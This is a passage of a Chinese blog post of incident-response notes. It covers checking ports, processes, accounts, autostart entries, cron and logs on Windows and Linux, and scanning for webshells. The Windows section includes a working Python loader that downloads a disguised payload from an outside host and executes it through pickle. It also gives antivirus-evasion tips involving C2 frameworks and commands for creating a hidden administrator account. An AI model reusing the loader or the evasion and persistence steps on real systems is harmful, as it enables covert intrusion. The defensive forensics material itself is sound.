119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:59370     101.89.15.105:443      ESTABLISHED     33384</span><br><span class=\"line\">  TCP    10.128.50.84:59493     20.198.162.76:443      ESTABLISHED     11804</span><br><span class=\"line\">  TCP    10.128.50.84:59899     150.158.219.208:443    ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:63118     119.38.189.36:3504     ESTABLISHED     32808</span><br><span class=\"line\">  TCP    10.128.50.84:63177     20.197.71.89:443       ESTABLISHED     11804</span><br></pre></td></tr></table></figure>\n<h4 id=\"进程\"><a class=\"markdownIt-Anchor\" href=\"#进程\">#</a> 进程</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310&gt;tasklist /svc | findstr 2208</span><br><span class=\"line\">LenovoInternetSoftwareFra     2208 暂缺</span><br></pre></td></tr></table></figure>\n<p>软件查杀</p>\n<blockquote>\n<p>PCHunter</p>\n<p>分析进程，分析签名，corporation 等</p>\n<p>火绒剑<br>\n process，autorun</p>\n<p>Process Monitor</p>\n</blockquote>\n<p>删除进程</p>\n<blockquote>\n<p>taskkill /F /T /PID 2208</p>\n<p>参数列表:</p>\n<pre><code>/S    system           指定要连接的远程系统。\n\n/U    [domain\\]user    指定应该在哪个用户上下文执行这个命令。\n\n/P    [password]       为提供的用户上下文指定密码。如果忽略，提示\n                       输入。\n\n/FI   filter           应用筛选器以选择一组任务。\n                       允许使用 &quot;*&quot;。例如，映像名称 eq acme*\n\n/PID  processid        指定要终止的进程的 PID。\n                       使用 TaskList 取得 PID。\n\n/IM   imagename        指定要终止的进程的映像名称。通配符 '*'可用来\n                       指定所有任务或映像名称。\n\n/T                     终止指定的进程和由它启用的子进程。\n\n/F                     指定强制终止进程。\n\n/?                     显示帮助消息。\n</code></pre>\n</blockquote>\n<p>找一些小众的 C2 框架，提升过免杀的概率</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTk3NzY3\">https://cloud.tencent.com/developer/article/1597767</span></p>\n<p>CS 上线</p>\n<blockquote>\n<p>netstat 中开始没有 cs 的连接，只有当 cs 中发出命令时才会建立连接，并且服务器发完命令立刻中断连接</p>\n<p>建立连接时间为 sleep</p>\n<p>因为受害者和攻击者通过中间的 teamserver 建立连接</p>\n</blockquote>\n<p>找进程</p>\n<blockquote>\n<p>tasklist  前提是没有注入进程</p>\n<p>注入进程后使用工具</p>\n</blockquote>\n<p>免杀通过 rc4 加密，比 aes 更好</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">import pickle as json</span><br><span class=\"line\">import ctypes</span><br><span class=\"line\">import urllib.request</span><br><span class=\"line\">import codecs</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\"># pick = &quot;&quot;&quot;</span><br><span class=\"line\"># json.loads(base64.b64decode(AES.new(b&#x27;ysIx0oKueJV15dkA4P3WvDjnq9giB62=&#x27;, AES.MODE_CBC, b&#x27;jbMNXRf954m0WUzQ&#x27;).decrypt(base64.b64decode((b&#x27;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&#x27;</span><br><span class=\"line\"># )))))</span><br><span class=\"line\"># &quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># res = base64.b64decode(AES.new(b&#x27;ysIx0oKueJV15dkA4P3WvDjnq9giB62=&#x27;, AES.MODE_CBC, b&#x27;jbMNXRf954m0WUzQ&#x27;).decrypt(base64.b64decode((b&#x27;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&#x27;</span><br><span class=\"line\"># ))))</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(res)</span><br><span class=\"line\">#</span><br><span class=\"line\"># class A(object):</span><br><span class=\"line\">#     def __reduce__(self):</span><br><span class=\"line\">#         return (exec, (pick,))</span><br><span class=\"line\"># ret = json.dumps(A())</span><br><span class=\"line\"># print(ret)</span><br><span class=\"line\"># res = base64.b64encode(ret)</span><br><span class=\"line\"># print(res)</span><br><span class=\"line\">html=urllib.request.urlopen(&#x27;http://i.miaosu.bid/data/f_41570228.gif&#x27;).read()[7:]</span><br><span class=\"line\">html = html.strip(b&#x27;\\r\\n&#x27;)</span><br><span class=\"line\">res = html[:-3][::-1]+html[-3:]</span><br><span class=\"line\"># print(base64.b64decode(res))</span><br><span class=\"line\">json.loads(base64.b64decode(res))</span><br></pre></td></tr></table></figure>\n<p>在通过 pyinstaller 无窗口编译成为 exe</p>\n<h4 id=\"账户\"><a class=\"markdownIt-Anchor\" href=\"#账户\">#</a> 账户</h4>\n<blockquote>\n<p>首选管理员账户登录，不建议创建账户</p>\n<p>通过 net use 或者 computer mananger 查看用户</p>\n<p>net user haha$ shabi /add      //$ 结尾的用户为影子用户</p>\n<p>net localgroup adminstrators haha$ /add     // 加到管理员组</p>\n<p>此时 net user 看不到，但 computer manager 能看到</p>\n<p>或者通过注册表注册</p>\n<p>先把影子账户和正常账户导出</p>\n<p>通过修改账户的 F 键为想要克隆的键</p>\n<p>导入注册表</p>\n<p>具体自己查吧…</p>\n<p>控制面板和 net user 看不到，但注册表还是可以看到的</p>\n<p>因此在应急响应时查账户要查三个地方</p>\n<p>注册表，控制面板，net user</p>\n<p>或者使用 D 盾</p>\n<p>或者查看日志 eventvwr.msc</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105174751675.png\" alt=\"image-20221105174751675\" style=\"zoom:80%;\" />\n<p>Windows logs -&gt; security</p>\n<p>4624 4625</p>\n</blockquote>\n<h4 id=\"启动项任务计划服务\"><a class=\"markdownIt-Anchor\" href=\"#启动项任务计划服务\">#</a> 启动项，任务计划，服务</h4>\n<blockquote>\n<p>工具可以排查服务和启动项</p>\n<p>任务计划 task scheduler</p>\n<p>注册表启动项</p>\n<p>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run<br>\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<br>\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce</p>\n<p>组策略 gpedit.msc 中 自启</p>\n<p>Windows 设置 -&gt; 脚本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108124205969.png\" alt=\"image-20221108124205969\"></p>\n</blockquote>\n<p>总结:<br>\n 用户 -&gt; 端口 -&gt; 进程 -&gt; 注册表 -&gt; 启动项 -&gt; 任务计划 -&gt; 服务 -&gt; 组策略</p>\n<h3 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\">#</a> Linux</h3>\n<h4 id=\"账户-2\"><a class=\"markdownIt-Anchor\" href=\"#账户-2\">#</a> 账户</h4>\n<p>1.passwd</p>\n<p>awk -F:  ‘{print $1,<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>3</mn><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">3,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8388800000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span></span></span></span>NF}’  | grep -Ev ‘nologin’</p>\n<p>排查 uid 和 gid , 和 bash</p>\n<p>2.shadow</p>\n<p>shadow 中第二列为！代表不能登录</p>\n<p>能正常登录的用户在第二列会有加密的密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、查询特权用户特权用户(uid 为0)</span><br><span class=\"line\">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\">2、查询可以远程登录的帐号信息</span><br><span class=\"line\">[root@localhost ~]# awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class=\"line\">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">4、禁用或删除多余及可疑的帐号</span><br><span class=\"line\">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class=\"line\">\tuserdel user       删除 user 用户</span><br><span class=\"line\">\tuserdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除</span><br></pre></td></tr></table></figure>\n<p>sudoers 中的内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## Allow root to run any commands anywhere </span><br><span class=\"line\">root    ALL=(ALL)       ALL</span><br><span class=\"line\"></span><br><span class=\"line\">## Allows members of the &#x27;sys&#x27; group to run networking, software, </span><br><span class=\"line\">## service management apps and more.</span><br><span class=\"line\"># %sys ALL = NETWORKING, SOFTWARE, SERVICES, STORAGE, DELEGATING, PROCESSES, LOCATE, DRIVERS</span><br><span class=\"line\"></span><br><span class=\"line\">## Allows people in group wheel to run all commands</span><br><span class=\"line\">%wheel  ALL=(ALL)       ALL</span><br><span class=\"line\"></span><br><span class=\"line\">## Same thing without a password</span><br><span class=\"line\"># %wheel        ALL=(ALL)       NOPASSWD: ALL</span><br></pre></td></tr></table></figure>\n<p>因此可能存在 sudo 提权</p>\n<h4 id=\"历史命名\"><a class=\"markdownIt-Anchor\" href=\"#历史命名\">#</a> 历史命名</h4>\n<p>可以查看不同用户的历史命令 ～/.bash_history</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、root 用户的历史命令</span><br><span class=\"line\">histroy</span><br><span class=\"line\">2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。</span><br><span class=\"line\">为历史的命令增加登录的 IP 地址、执行命令时间等信息：</span><br><span class=\"line\">1）保存1万条命令</span><br><span class=\"line\">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class=\"line\">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class=\"line\">######jiagu history xianshi#########</span><br><span class=\"line\">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class=\"line\">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class=\"line\">then</span><br><span class=\"line\">USER_IP=`hostname`</span><br><span class=\"line\">fi</span><br><span class=\"line\">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class=\"line\">shopt -s histappend</span><br><span class=\"line\">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class=\"line\">######### jiagu history xianshi ##########</span><br><span class=\"line\">3）source /etc/profile 让配置生效</span><br><span class=\"line\">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class=\"line\">3、历史操作命令的清除：history -c</span><br><span class=\"line\">但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</span><br></pre></td></tr></table></figure>\n<h4 id=\"端口-2\"><a class=\"markdownIt-Anchor\" href=\"#端口-2\">#</a> 端口</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -lntup | more</span><br><span class=\"line\">查看下 pid 所对应的进程文件路径，</span><br><span class=\"line\">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）</span><br><span class=\"line\">如果要排查对应的pid的执行文件</span><br><span class=\"line\">在/proc/$pid/exe</span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM-16-11-centos 6852]# pwd</span><br><span class=\"line\">/proc/6852</span><br><span class=\"line\">[root@VM-16-11-centos 6852]# ls -al</span><br><span class=\"line\">dr-xr-xr-x   9 lighthouse lighthouse 0 Sep 11 14:30 .</span><br><span class=\"line\">dr-xr-xr-x 163 root       root       0 Mar 22  2022 ..</span><br><span class=\"line\">dr-xr-xr-x   2 lighthouse lighthouse 0 Nov  8 17:00 attr</span><br><span class=\"line\">lrwxrwxrwx   1 lighthouse lighthouse 0 Nov  8 17:01 cwd -&gt; /www/wwwroot/www.radsm.co/beef_1/beef</span><br><span class=\"line\">-r--------   1 lighthouse lighthouse 0 Nov  8 17:01 environ</span><br><span class=\"line\">lrwxrwxrwx   1 lighthouse lighthouse 0 Nov  8 17:01 exe -&gt; /home/lighthouse/.rvm/rubies/ruby-3.0.3/bin/ruby</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"进程-2\"><a class=\"markdownIt-Anchor\" href=\"#进程-2\">#</a> 进程</h4>\n<blockquote>\n<p>ps aux | ps ef</p>\n</blockquote>\n<h4 id=\"启动项\"><a class=\"markdownIt-Anchor\" href=\"#启动项\">#</a> 启动项</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/rc.local</span><br></pre></td></tr></table></figure>\n<h4 id=\"任务计划\"><a class=\"markdownIt-Anchor\" href=\"#任务计划\">#</a> 任务计划</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab -l   列出某个用户cron服务的详细内容</span><br><span class=\"line\"></span><br><span class=\"line\">重点关注以下目录中是否存在恶意脚本</span><br><span class=\"line\">/var/spool/cron/* </span><br><span class=\"line\">/etc/crontab</span><br><span class=\"line\">/etc/cron.d/*</span><br><span class=\"line\">/etc/cron.daily/* </span><br><span class=\"line\">/etc/cron.hourly/* </span><br><span class=\"line\">/etc/cron.monthly/*</span><br><span class=\"line\">/etc/cron.weekly/</span><br><span class=\"line\">/etc/anacrontab</span><br><span class=\"line\">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>\n<h4 id=\"日志\"><a class=\"markdownIt-Anchor\" href=\"#日志\">#</a> 日志</h4>\n<p>日志默认存放位置：/var/log/</p>\n<p>查看日志配置情况：more /etc/rsyslog.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class=\"line\">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | uniq -c | sort -nr | more</span><br><span class=\"line\"></span><br><span class=\"line\">定位有哪些IP在爆破：</span><br><span class=\"line\">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class=\"line\"></span><br><span class=\"line\">爆破用户名字典是什么？</span><br><span class=\"line\">grep &quot;Failed password&quot; /var/log/secure| awk &#x27;&#123;print $9&#125;&#x27; | sort -nr | uniq -c</span><br><span class=\"line\"> </span><br><span class=\"line\">2、登录成功的IP有哪些： \t</span><br><span class=\"line\">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class=\"line\"></span><br><span class=\"line\">登录成功的日期、用户名、IP：</span><br><span class=\"line\">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class=\"line\"></span><br><span class=\"line\">3、增加一个用户kali日志：</span><br><span class=\"line\">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class=\"line\">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class=\"line\">, shell=/bin/bash</span><br><span class=\"line\">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class=\"line\">#grep &quot;useradd&quot; /var/log/secure </span><br><span class=\"line\"></span><br><span class=\"line\">4、删除用户kali日志：</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class=\"line\"># grep &quot;userdel&quot; /var/log/secure</span><br><span class=\"line\"></span><br><span class=\"line\">5、su切换用户：</span><br><span class=\"line\">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class=\"line\"></span><br><span class=\"line\">sudo授权执行:</span><br><span class=\"line\">sudo -l</span><br><span class=\"line\">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108174528702.png\" alt=\"image-20221108174528702\"></p>\n<p>账户 历史命令 端口 进程 开机启动 任务计划 日志</p>\n<h3 id=\"webshell-查杀\"><a class=\"markdownIt-Anchor\" href=\"#webshell-查杀\">#</a> webshell 查杀</h3>\n<h4 id=\"工具\"><a class=\"markdownIt-Anchor\" href=\"#工具\">#</a> 工具</h4>\n<p>1.D 盾</p>\n<p>2. 河马</p>\n<p>3. 百度 webdir</p>\n<p>4. 在线 webshell 查杀 bugscanner</p>\n<h4 id=\"发现webshell后门\"><a class=\"markdownIt-Anchor\" href=\"#发现webshell后门\">#</a> 发现 webshell 后门</h4>\n<p>1. 判断 hash</p>\n<p>2.diff</p>\n<figure class=\"highlight plaintext\"><table><tr><td 